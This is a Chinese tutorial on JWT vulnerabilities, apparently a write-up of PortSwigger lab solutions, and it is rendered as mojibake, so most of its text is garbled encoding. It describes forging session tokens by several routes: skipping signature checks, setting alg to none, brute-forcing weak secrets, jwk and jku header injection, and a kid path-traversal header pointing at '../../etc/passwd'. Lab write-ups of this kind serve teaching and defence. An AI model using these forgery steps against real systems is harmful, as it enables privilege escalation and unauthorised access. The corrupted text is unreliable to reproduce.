å¯†çš„JWTã€‚å®ƒæ˜¯åœ¨JWSåŸºç¡€ä¸Šè¿›è¡Œäº†è¿›ä¸€æ­¥çš„åŠ å¯†ï¼Œå°†JWTçš„Payloadéƒ¨åˆ†åŠ å¯†åå¾—åˆ°çš„ç»“æœã€‚JWEå¯ç”¨äºä¿æŠ¤æ•æ„Ÿä¿¡æ¯ï¼Œç¡®ä¿åªæœ‰æˆæƒçš„æ¥æ”¶æ–¹èƒ½å¤Ÿè§£å¯†å’Œè¯»å–JWTçš„å†…å®¹ã€‚ JKUï¼ˆJSON Web Key Set URLï¼‰ï¼šJKUæ˜¯JWT Headerä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œè¯¥å­—æ®µåŒ…å«ä¸€ä¸ªURIï¼Œç”¨äºæŒ‡å®šç”¨äºéªŒè¯ä»¤ç‰Œå¯†é’¥çš„æœåŠ¡å™¨ã€‚å½“éœ€è¦è·å–å…¬é’¥æˆ–å¯†é’¥é›†åˆæ—¶ï¼Œå¯ä»¥ä½¿ç”¨JKUå­—æ®µæŒ‡å®šçš„URIæ¥è·å–ç›¸å…³çš„JWKä¿¡æ¯ã€‚ X5Uï¼šX5Uæ˜¯JWT Headerä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œå®ƒæ˜¯ä¸€ä¸ªURLï¼ŒæŒ‡å‘ä¸€ç»„X.509å…¬é’¥è¯ä¹¦ã€‚ç±»ä¼¼äºJKUï¼ŒX5Uå­—æ®µç”¨äºæŒ‡å®šå¯ç”¨äºéªŒè¯JWTçš„å…¬é’¥è¯ä¹¦çš„ä½ç½®ã€‚ X.509æ ‡å‡†ï¼šX.509æ˜¯ä¸€ç§å¯†ç å­¦æ ‡å‡†ï¼Œå®šä¹‰äº†å…¬å…±å¯†é’¥åŸºç¡€è®¾æ–½ï¼ˆPKIï¼‰ä¸­çš„æ•°å­—è¯ä¹¦æ ¼å¼ã€‚è¿™äº›è¯ä¹¦åŒ…å«æœ‰å…³å®ä½“ï¼ˆä¾‹å¦‚ä¸ªäººã€ç»„ç»‡æˆ–è®¾å¤‡ï¼‰çš„ä¿¡æ¯ï¼Œä»¥åŠç›¸å…³çš„å…¬é’¥å’Œæ•°å­—ç­¾åã€‚X.509è¯ä¹¦åœ¨è®¸å¤šäº’è”ç½‘åè®®ä¸­å¹¿æ³›ä½¿ç”¨ï¼Œå¦‚TLSSSLç­‰ã€‚ è§£å¯†å¹³å°ä¸‹é¢æ˜¯ä¸€ä¸ªJWTåœ¨çº¿æ„é€ å’Œè§£æ„çš„å¹³å°ï¼š https://jwt.io/ å·¥ä½œåŸç†JWTçš„å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š ç”¨æˆ·åœ¨å®¢æˆ·ç«¯ç™»å½•å¹¶å°†ç™»å½•ä¿¡æ¯å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨ä½¿ç”¨ç§é’¥å¯¹ç”¨æˆ·ä¿¡æ¯è¿›è¡ŒåŠ å¯†ç”ŸæˆJWTå¹¶å°†å…¶å‘é€ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯å°†JWTå­˜å‚¨åœ¨æœ¬åœ°ï¼Œæ¯æ¬¡å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶æºå¸¦JWTè¿›è¡Œè®¤è¯ æœåŠ¡å™¨ä½¿ç”¨å…¬é’¥å¯¹JWTè¿›è¡Œè§£å¯†å’ŒéªŒè¯ï¼Œæ ¹æ®JWTä¸­çš„ä¿¡æ¯è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›å“åº”ï¼Œå®¢æˆ·ç«¯æ ¹æ®å“åº”è¿›è¡Œç›¸åº”çš„æ“ä½œ JWT åŸºç¡€å®‰å…¨é—®é¢˜ï¼ˆbpé¶åœºï¼‰1ã€æœªå¯¹ç­¾åè¿›è¡ŒéªŒè¯JWTåº“ä¼šé€šå¸¸æä¾›ä¸€ç§éªŒè¯ä»¤ç‰Œçš„æ–¹æ³•å’Œä¸€ç§è§£ç ä»¤ç‰Œçš„æ–¹æ³•ï¼Œæ¯”å¦‚:Node.jsåº“jsonwebtokenæœ‰verify()å’Œdecode()ï¼Œæœ‰æ—¶å¼€å‘äººå‘˜ä¼šæ··æ·†è¿™ä¸¤ç§æ–¹æ³•ï¼Œåªå°†ä¼ å…¥çš„ä»¤ç‰Œä¼ é€’ç»™decode()æ–¹æ³•ï¼Œè¿™æ„å‘³ç€åº”ç”¨ç¨‹åºæ ¹æœ¬ä¸éªŒè¯ç­¾å ä¸‹è¾¹æˆ‘ä»¬é€šè¿‡portswiggeré¶åœºæ¥æ¼”ç¤ºä¸€ä¸‹è¿™ä¸ªæ¼æ´æ¡ˆä¾‹ï¼š è¦æ±‚ï¼šæ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚ç”±äºå®ç°ç¼ºé™·ï¼ŒæœåŠ¡å™¨ä¸ä¼šéªŒè¯å®ƒæ”¶åˆ°çš„ä»»ä½• JWT çš„ç­¾åã€‚è¦è§£å†³è¯¥å®éªŒï¼Œè¯·ä¿®æ”¹æ‚¨çš„ä¼šè¯ä»¤ç‰Œä»¥è®¿é—® /admin ä¸Šçš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter é¦–å…ˆæˆ‘ä»¬å…ˆç™»å½•é¢˜ç›®æä¾›çš„è´¦å·wienerï¼Œç„¶åå»bpçš„HTTPå†å²è®°å½•é‡Œé¢æŸ¥çœ‹ç›¸å…³æ¡ç›® å¯ä»¥å‘ç°åœ¨æˆ‘ä»¬ç™»é™†çš„æ—¶å€™å“åº”åŒ…è®¾ç½®äº†ä¸€ä¸ªseesionå€¼ï¼Œè§‚å¯Ÿå…¶ç»“æ„å¯ä»¥å‘ç°æ˜¯JWTå½¢å¼çš„ï¼Œå…¶payloadéƒ¨åˆ†é€‰ä¸­å³å¯æŸ¥çœ‹ åœ¨è¯¥æ¡ç›®ä¸‹å¯ä»¥å‘ç°æˆ‘ä»¬ç™»å½•æˆåŠŸçš„å‡­è¯æ˜¯sessionå€¼ï¼Œæ ¹æ®é¢˜ç›®æç¤ºå¯ä»¥çŸ¥é“è¯¥é¢˜åªæœ‰è§£ç ï¼Œæ²¡æœ‰éªŒè¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹payloadéƒ¨åˆ†å®ç°èº«ä»½å˜æ›´ è®¿é—®adminï¼Œå›æ˜¾æç¤ºéœ€è¦administratorèº«ä»½æ‰å¯ä»¥è®¿é—® å°†æ¡ç›®my-account?idwienerå‘é€è‡³repeaterï¼Œåœ¨è¯·æ±‚é¢æ¿ä¸­ï¼Œè½¬åˆ° JSON Web Token é€‰é¡¹å¡ï¼ˆæ³¨æ„è¯¥é€‰é¡¹å¡éœ€è¦æå‰å®‰è£…æ’ä»¶JWT Editorï¼‰ å°†å…¶ä¸­çš„subå€¼æ”¹ä¸ºadministratorï¼Œå¤åˆ¶JWTå€¼ï¼Œåœ¨sessionå¤„è¿›è¡Œæ›¿æ¢ï¼Œä¾¿å¯ä»¥æˆåŠŸè®¿é—®adminï¼Œåˆ é™¤ç”¨æˆ·carlosï¼Œé¢˜ç›®è§£å†³ 2ã€æœªå¯¹åŠ å¯†ç®—æ³•è¿›è¡Œå¼ºéªŒè¯åœ¨JWTçš„Headerä¸­algçš„å€¼ç”¨äºå‘Šè¯‰æœåŠ¡å™¨ä½¿ç”¨å“ªç§ç®—æ³•å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œä»è€Œå‘Šè¯‰æœåŠ¡å™¨åœ¨éªŒè¯ç­¾åæ—¶éœ€è¦ä½¿ç”¨å“ªç§ç®—æ³•ï¼ŒJWTåŒæ—¶ä¹Ÿæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€Noneâ€ï¼Œå¦‚æœâ€algâ€å­—æ®µè®¾ä¸ºâ€Noneâ€ï¼Œåˆ™æ ‡è¯†ä¸ç­¾åï¼ˆåé¢ç­¾åéƒ¨åˆ†å¯ä»¥ç›´æ¥åˆ å»ï¼‰ï¼Œè¿™æ ·ä¸€æ¥ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œè®¾å®šè¯¥åŠŸèƒ½çš„æœ€åˆç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œä½†æ˜¯è‹¥ä¸åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å…³é—­è¯¥åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å°†algå­—æ®µè®¾ç½®ä¸ºâ€Noneâ€æ¥ä¼ªé€ ä»–ä»¬æƒ³è¦çš„ä»»ä½•tokenï¼Œæ¥ç€ä¾¿å¯ä»¥ä½¿ç”¨ä¼ªé€ çš„tokenå†’å……ä»»æ„ç”¨æˆ·ç™»é™†ç½‘ç«™ ä¸‹é¢ä¸ºportswiggeré¶åœºä¸­çš„ä¸€ä¸ªæ¼æ´æ¡ˆä¾‹ï¼š æ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚æœåŠ¡å™¨è¢«ä¸å®‰å…¨åœ°é…ç½®ä¸ºæ¥å—æœªç­¾åçš„ JWTã€‚è¦è§£å†³è¯¥å®éªŒï¼Œè¯·ä¿®æ”¹æ‚¨çš„ä¼šè¯ä»¤ç‰Œä»¥è®¿é—® /admin ä¸Šçš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter å¼€å¯é¢˜ç›®ç¯å¢ƒï¼Œç™»å½•è´¦å·åæŒ‰ç…§ä¸Šä¸€é¢˜è¿›è¡Œæ“ä½œï¼Œç»“æœä¼šå¤±è´¥ï¼Œå›æ˜¾è¡¨æ˜è¯¥é¢˜æœ‰å¼€å¯éªŒè¯æ–¹æ³• å°†headeréƒ¨åˆ†algçš„å€¼æ”¹ä¸ºnoneåï¼ŒåŒæ—¶å°†ç­¾åéƒ¨åˆ†åˆ å»ï¼Œè¦ä¿ç•™payloadéƒ¨åˆ†çš„ç‚¹ æ›´æ”¹sessionå€¼å¹¶è®¿é—®adminï¼ŒæˆåŠŸå¦‚ä¸‹ ç„¶åä¾¿å¯ä»¥åˆ å»ç”¨æˆ·carlosï¼Œè§£å†³é¢˜ç›® 3ã€å¼±å¯†é’¥å¦‚æœä½¿ç”¨äº†ä¸å®‰å…¨çš„ç®—æ³•ï¼ˆå¦‚å¼± HMAC å“ˆå¸Œç®—æ³•ï¼‰ï¼Œæˆ–è€…ç®—æ³•å‚æ•°ï¼ˆå¦‚å¯†é’¥é•¿åº¦ï¼‰ä¸è¶³å¤Ÿå¼ºï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£ã€ç¢°æ’æ”»å‡»æˆ–å…¶ä»–å¯†ç å­¦æ”»å‡»æ¥ä¼ªé€ æœ‰æ•ˆçš„ JWT ä¸‹é¢ä¸ºportswiggeré¶åœºä¸­çš„ä¸€ä¸ªæ¼æ´æ¡ˆä¾‹ï¼š è¦è§£å†³å®éªŒå®¤é—®é¢˜ï¼Œè¯·å…ˆæš´åŠ›ç ´è§£ç½‘ç«™çš„å¯†é’¥ã€‚è·å¾—æ­¤ä»¤ç‰Œåï¼Œä½¿ç”¨å®ƒå¯¹ä¿®æ”¹åçš„ä¼šè¯ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œè¯¥ä»¤ç‰Œå…è®¸æ‚¨è®¿é—® /admin çš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter å‰é¢ä¸¤ç§æ–¹æ³•éƒ½ä¸èµ·ä½œç”¨ï¼Œæ‰€ä»¥å¼€å§‹å°è¯•çˆ†ç ´å¯†é’¥ JWTå­—å…¸ï¼šhttps://github.com/wallarm/jwt-secrets æˆ‘ä»¬ä½¿ç”¨jwt_toolæ¥çˆ†ç ´JWTï¼šhttps://github.com/ticarpi/jwt_tool ä½¿ç”¨æ•™ç¨‹ï¼šhttps://www.cnblogs.com/xiaozi/p/12005929.html é¦–å…ˆç™»å½•æ‹¿åˆ°è´¦å·çš„jwtï¼Œç„¶åå°†è¯¥jwtæ‹¿å»çˆ†ç ´ï¼Œç»“æœå¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ç»“æœä¸­è¡¨æ˜secret1å°±æ˜¯è¯¥jwtçš„å¯†é’¥ æ‹¿åˆ°è§£å¯†å¹³å°ä¸­å»ä¼ªé€ ä¸€ä¸ªæˆ‘ä»¬æ‰€éœ€çš„jwt è¦è®°å¾—subå€¼è¦ä¸ºç®¡ç†å‘˜çš„èº«ä»½ ç„¶åæ‹¿ç€ä¼ªé€ çš„jwtå»è®¿é—®adminï¼ŒæˆåŠŸè®¿é—®ï¼Œåˆ é™¤è¦æ±‚ç”¨æˆ·ä¾¿å¯ä»¥ï¼Œé¢˜ç›®è§£å†³ JWTæ ‡å¤´æ³¨å…¥1ã€é€šè¿‡jwkå‚æ•°æ³¨å…¥è‡ªç­¾åçš„JWTé€šè¿‡ JWKï¼ˆJSON Web Keyï¼‰å‚æ•°æ³¨å…¥è‡ªç­¾å JWT çš„æ¼æ´æ˜¯ä¸€ç§åˆ©ç”¨ä¸å®‰å…¨çš„ JWT å¤„ç†æ–¹å¼æ¥ä¼ªé€ æœ‰æ•ˆèº«ä»½çš„æ”»å‡»æ‰‹æ³•ã€‚è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ç”±äºä¸å®‰å…¨åœ°å¤„ç†å’Œè§£æ JWT çš„ å…¬é’¥ï¼Œç‰¹åˆ«æ˜¯å½“æœåŠ¡å™¨å…è®¸ç”¨æˆ·é€šè¿‡ JWT æä¾›è‡ªå®šä¹‰çš„ JWK æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ¥ä¼ªé€ åˆæ³•çš„ç­¾åï¼Œä»è€Œå†’å……å…¶ä»–ç”¨æˆ·æˆ–æå‡æƒé™ã€‚ æ¼æ´å·¥ä½œåŸç†JWT é€šå¸¸ç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“èº«ä»½ä¿¡æ¯ã€‚JWT çš„å®‰å…¨æ€§ä¾èµ–äºæ­£ç¡®çš„ç­¾åå’ŒéªŒè¯è¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯æ¼æ´çš„å…³é”®ç‚¹ï¼š JWT ç­¾åä¸éªŒè¯æœºåˆ¶ï¼š JWT å¯ä»¥ä½¿ç”¨å¯¹ç§°ç®—æ³•ï¼ˆå¦‚ HS256ï¼‰æˆ–éå¯¹ç§°ç®—æ³•ï¼ˆå¦‚ RS256ï¼‰æ¥è¿›è¡Œç­¾åã€‚ åœ¨éå¯¹ç§°ç®—æ³•ä¸­ï¼ˆå¦‚ RS256ï¼‰ï¼Œç­¾åæ˜¯é€šè¿‡ ç§é’¥ ç”Ÿæˆçš„ï¼Œè€ŒéªŒè¯åˆ™ä½¿ç”¨ å…¬é’¥ã€‚ **JWK (JSON Web Key)**ï¼š JWK æ˜¯ä¸€ç§ç”¨äºè¡¨ç¤ºå¯†é’¥çš„æ ‡å‡†åŒ–æ ¼å¼ã€‚JWT å¤´éƒ¨ä¸­å¯ä»¥åŒ…å«ä¸€ä¸ª jwk å­—æ®µï¼Œè¡¨ç¤ºå…¬é’¥çš„ç›¸å…³ä¿¡æ¯ã€‚ å½“æœåŠ¡å™¨åœ¨éªŒè¯ JWT æ—¶ï¼Œå¦‚æœå‘ç° JWT ä¸­åŒ…å« jwk å‚æ•°ï¼Œå®ƒä¼šå°è¯•ä»ä¸­è§£æå‡ºå…¬é’¥ï¼Œå¹¶ç”¨è¯¥å…¬é’¥æ¥éªŒè¯ JWT çš„ç­¾åã€‚ JWK å‚æ•°æ³¨å…¥çš„æ”»å‡»æ€è·¯ï¼š æœåŠ¡å™¨å¦‚æœå…è®¸ç”¨æˆ·é€šè¿‡ JWT çš„å¤´éƒ¨ä¼ é€’ è‡ªå®šä¹‰çš„ JWKï¼Œå¹¶æ²¡æœ‰ä¸¥æ ¼éªŒè¯è¿™ä¸ªå…¬é’¥çš„æ¥æºæˆ–åˆæ³•æ€§ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ³¨å…¥è‡ªå·±çš„å…¬é’¥æ¥ç”Ÿæˆå’ŒéªŒè¯ä¼ªé€ çš„ç­¾åã€‚ æ”»å‡»è€…é¦–å…ˆç”Ÿæˆä¸€å¯¹ ç§é’¥å…¬é’¥ï¼Œä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹ JWT è¿›è¡Œç­¾åï¼Œç„¶ååœ¨ JWT çš„å¤´éƒ¨åŒ…å«æ”»å‡»è€…çš„å…¬é’¥ä¿¡æ¯ã€‚ç”±äºæœåŠ¡å™¨é”™è¯¯åœ°ä¿¡ä»»äº† JWT ä¸­çš„ JWK å‚æ•°ï¼Œå®ƒä¼šç”¨æ”»å‡»è€…æä¾›çš„å…¬é’¥éªŒè¯æ”»å‡»è€…çš„ä¼ªé€ ç­¾åï¼Œä»è€Œè®¤ä¸º JWT æ˜¯åˆæ³•çš„ã€‚ æ”»å‡»è¿‡ç¨‹ ç”Ÿæˆæ”»å‡»è€…çš„å¯†é’¥å¯¹ï¼š æ”»å‡»è€…é¦–å…ˆç”Ÿæˆä¸€å¯¹éå¯¹ç§°å¯†é’¥å¯¹ï¼ˆç§é’¥å’Œå…¬é’¥ï¼‰ï¼Œç”¨äºä¼ªé€  JWTã€‚ ä¼ªé€  JWTï¼š æ”»å‡»è€…ç”¨è‡ªå·±çš„ ç§é’¥ ç­¾åä¸€ä¸ªè‡ªå®šä¹‰çš„ JWTï¼ˆå¯ä»¥ä¿®æ”¹è½½è·ä¸­çš„æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚æå‡æƒé™ï¼‰ã€‚ åœ¨ JWT å¤´éƒ¨çš„ jwk å‚æ•°ä¸­ï¼Œæ”»å‡»è€…åŒ…å«è‡ªå·±çš„ å…¬é’¥ï¼Œç”¨äºè®©æœåŠ¡å™¨åœ¨éªŒè¯æ—¶é”™è¯¯åœ°æ¥å—è¿™ä¸ªä¼ªé€ çš„å…¬é’¥ã€‚ JWT å¤´éƒ¨ç¤ºä¾‹ï¼š alg: RS256, jwk: kty: RSA, n: attackers public key modulus, e: AQAB å‘é€ä¼ªé€ çš„ JWTï¼š æ”»å‡»è€…å°†ä¼ªé€ çš„ JWT å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨é”™è¯¯åœ°ä½¿ç”¨ JWT ä¸­çš„æ”»å‡»è€…å…¬é’¥æ¥éªŒè¯ç­¾åã€‚ ç»•è¿‡ç­¾åéªŒè¯ï¼š ç”±äºæœåŠ¡å™¨ä½¿ç”¨æ”»å‡»è€…çš„å…¬é’¥ï¼ŒéªŒè¯é€šè¿‡ï¼Œæ”»å‡»è€…æˆåŠŸä¼ªé€ äº†ä¸€ä¸ªåˆæ³•çš„ JWTï¼Œä»è€Œç»•è¿‡èº«ä»½éªŒè¯æˆ–æƒé™æ§åˆ¶ã€‚ é¢˜ç›®äº†è§£äº†åŸç†ä¹‹åï¼Œé¶åœºä¸­çš„é¢˜ç›®ä¾¿å¯ä»¥è½»æ¾è§£å†³äº† è¦æ±‚ï¼šæ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚æœåŠ¡å™¨æ”¯æŒ JWT æ ‡å¤´ä¸­çš„ jwk å‚æ•°ã€‚è¿™æœ‰æ—¶ç”¨äºå°†æ­£ç¡®çš„éªŒè¯å¯†é’¥ç›´æ¥åµŒå…¥åˆ°ä»¤ç‰Œä¸­ã€‚ä½†æ˜¯ï¼Œå®ƒæ— æ³•æ£€æŸ¥æä¾›çš„å¯†é’¥æ˜¯å¦æ¥è‡ªå—ä¿¡ä»»çš„æ¥æºã€‚è¦è§£å†³å®éªŒé—®é¢˜ï¼Œè¯·ä¿®æ”¹å¹¶ç­¾ç½²ä¸€ä¸ª JWTï¼Œè¯¥ JWT å…è®¸æ‚¨è®¿é—® /admin çš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter é¦–å…ˆç™»å½•è´¦å·ï¼Œåˆ©ç”¨bpè·å–åˆ°jwt åˆ©ç”¨bpä¸­çš„æ’ä»¶JWT Editorç”Ÿæˆä¸€ä¸ªæ–°çš„RSAå¯†é’¥ å°†æˆ‘ä»¬æ‰€éœ€çš„æ¡ç›®ï¼ˆåªè¦æœ‰JWTå€¼å¾—éƒ½å¯ä»¥ï¼‰æ”¾å…¥é‡æ”¾å™¨ä¸­ï¼Œé€‰é¡¹é€‰æ‹©JSON Web Token kidå€¼è¦æ”¹ä¸ºåˆšç”Ÿæˆçš„å¯†é’¥idï¼Œsubå€¼è¦æ”¹ä¸ºç®¡ç†å‘˜ é¦–å…ˆç‚¹å‡»æ”»å‡»ï¼Œé€‰æ‹©ç¬¬ä¸€ä¸ªåå°†æˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„RSAå¯†é’¥å¯¼å…¥è¿›å»ï¼Œæœ€åå°†æ–°ç”Ÿæˆçš„JWTå¤åˆ¶å³å¯ å›åˆ°è°·æ­Œï¼Œåˆ©ç”¨æ’ä»¶Cookie Editorå°†æˆ‘ä»¬çš„sessionå€¼è¿›è¡Œæ›´æ”¹ï¼Œä¿å­˜ è®¿é—®adminï¼Œåˆ å»ç”¨æˆ·carlosï¼Œé¢˜ç›®è§£å†³ 2ã€é€šè¿‡jkuå‚æ•°æ³¨å…¥è‡ªç­¾åçš„JWTæ¼æ´æˆå›  ä¿¡ä»»å¤–éƒ¨ jku æºï¼šåœ¨ä¸€äº›æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å…è®¸å®¢æˆ·ç«¯é€šè¿‡ jku å‚æ•°æä¾›ä¸€ä¸ª URLï¼ŒæœåŠ¡å™¨ä¼šä»è¿™ä¸ª URL è·å–å…¬é’¥æ¥éªŒè¯ JWT çš„ç­¾åã€‚å¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹ jku å‚æ•°ä¸­çš„ URL è¿›è¡Œä¸¥æ ¼é™åˆ¶æˆ–æ ¡éªŒï¼Œæ”»å‡»è€…å¯ä»¥å°†è¯¥ URL æŒ‡å‘ä»–ä»¬æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œä»è€Œæä¾›ä¸€ä¸ªä¼ªé€ çš„å…¬é’¥ã€‚ è‡ªç­¾å JWTï¼šæ”»å‡»è€…å¯ä»¥ç”Ÿæˆä¸€ä¸ªåˆæ³•æ ¼å¼çš„ JWTï¼Œå¹¶ä½¿ç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œç­¾åã€‚éšåï¼Œä»–ä»¬å°† jku æŒ‡å‘è‡ªå·±æ§åˆ¶çš„æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨ä¼šè¿”å›ä¸å…¶ç§é’¥å¯¹åº”çš„å…¬é’¥ã€‚ç”±äºæœåŠ¡å™¨ä¿¡ä»» jku æä¾›çš„å…¬é’¥ï¼Œå› æ­¤ä¼šé”™è¯¯åœ°éªŒè¯æ”»å‡»è€…ç­¾åçš„ JWTã€‚ ç»•è¿‡ç­¾åéªŒè¯ï¼šé€šè¿‡æ“æ§ jku å‚æ•°ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆçš„ JWTï¼ŒæœåŠ¡å™¨ç”±äºä½¿ç”¨äº†é”™è¯¯çš„å…¬é’¥éªŒè¯ç­¾åï¼Œè®¤ä¸ºè¯¥ JWT æ˜¯åˆæ³•çš„ã€‚è¿™å¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å¾—æå‡çš„æƒé™æˆ–æœªæˆæƒçš„è®¿é—®ã€‚ é¢˜ç›®è¦æ±‚ï¼šæ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚æœåŠ¡å™¨æ”¯æŒ JWT æ ‡å¤´ä¸­çš„ jku å‚æ•°ã€‚ä½†æ˜¯ï¼Œåœ¨è·å–å¯†é’¥ä¹‹å‰ï¼Œå®ƒæ— æ³•æ£€æŸ¥æä¾›çš„ URL æ˜¯å¦å±äºå—ä¿¡ä»»çš„åŸŸã€‚è¦è§£å†³å®éªŒé—®é¢˜ï¼Œè¯·ä¼ªé€ ä¸€ä¸ª JWTï¼Œè®©æ‚¨èƒ½å¤Ÿè®¿é—® /admin çš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter é¦–å…ˆç™»é™†è´¦å·ï¼Œè·å–åˆ°æˆ‘ä»¬æ‰€éœ€çš„jwt å› ä¸ºæ¥å—jkuå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ä¼ªé€ ä¸€ä¸ª é¦–å…ˆå¤åˆ¶å…¬é’¥ï¼Œå°†å…¶æ‹¿åˆ°é¢˜ç›®æä¾›çš„æœåŠ¡å™¨ä¸­å» è¦è®°ä½å†ç²˜è´´ä¹‹å‰éœ€è¦åŠ ä¸Škeyå¤´ keys: [ ] å¦‚ä¸‹ï¼š å¤åˆ¶æ¼æ´æœåŠ¡å™¨çš„åœ°å€ å›åˆ°bpä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹kidå’Œsubå€¼ï¼Œæ·»åŠ jkué”®å€¼å¯¹ æ›´æ”¹ç»“æŸåï¼Œç‚¹å‡»Signï¼Œè¦é€‰å¯¹æ¨¡å¼ ç„¶åiå°†æ–°ç”Ÿæˆçš„jwtå¤åˆ¶åæ‹¿å»æ›¿æ¢æ‰åŸæ¥çš„jwtå€¼ï¼Œè¿›å…¥adminï¼Œåˆ å»ç”¨æˆ·carlosï¼Œé¢˜ç›®è§£å†³ 3ã€é€šè¿‡ kid æ³¨å…¥ JWTï¼Œä¸ç›®å½•éå†æ”»å‡»ç›¸ç»“åˆåœ¨ JWT (JSON Web Token) éªŒè¯æœºåˆ¶ä¸­ï¼Œkidï¼ˆKey IDï¼‰æ˜¯ JWT å¤´éƒ¨å­—æ®µçš„ä¸€éƒ¨åˆ†ï¼Œé€šå¸¸ç”¨äºæŒ‡ç¤ºæœåŠ¡å™¨åº”ä½¿ç”¨å“ªä¸ªå¯†é’¥æ¥éªŒè¯ JWT çš„ç­¾åã€‚ç„¶è€Œï¼Œå¦‚æœæœåŠ¡å™¨å¤„ç† kid æ—¶æ²¡æœ‰é€‚å½“çš„è¾“å…¥éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ kid æ³¨å…¥ä¸ç›®å½•éå†æ”»å‡»ç›¸ç»“åˆï¼Œç»•è¿‡ JWT çš„ç­¾åéªŒè¯æˆ–æ»¥ç”¨æœåŠ¡å™¨çš„å¯†é’¥ç®¡ç†é€»è¾‘ï¼Œå¯¼è‡´æœªæˆæƒè®¿é—®æˆ–æƒé™æå‡ã€‚ å½“ JWT ä½¿ç”¨çš„æ˜¯å¯¹ç§°åŠ å¯†ç®—æ³•çš„æ—¶å€™ï¼Œææœ‰å¯èƒ½å­˜åœ¨ç›®å½•éå†çš„æ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¼ºåˆ¶æœåŠ¡å™¨ä½¿ç”¨å…¶æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä»»æ„æ–‡ä»¶ä½œä¸ºéªŒè¯å¯†é’¥ æ”»å‡»åŸç†JWT çš„å¤´éƒ¨ç¤ºä¾‹ï¼š alg: HS256, typ: JWT, kid: ../../etc/passwd kid çš„ä½œç”¨ï¼š åœ¨ JWT å¤´éƒ¨ä¸­ï¼Œkid å‚æ•°ç”¨äºæŒ‡ç¤ºæœåŠ¡å™¨åº”ä½¿ç”¨å“ªä¸ªå¯†é’¥ï¼ˆæˆ–å¯†é’¥æ–‡ä»¶ï¼‰æ¥éªŒè¯ç­¾åã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨ä»é¢„å®šä¹‰çš„è·¯å¾„ä¸­åŠ è½½ kid å¯¹åº”çš„å¯†é’¥ï¼ˆå¦‚ keys/kid.keyï¼‰ã€‚ 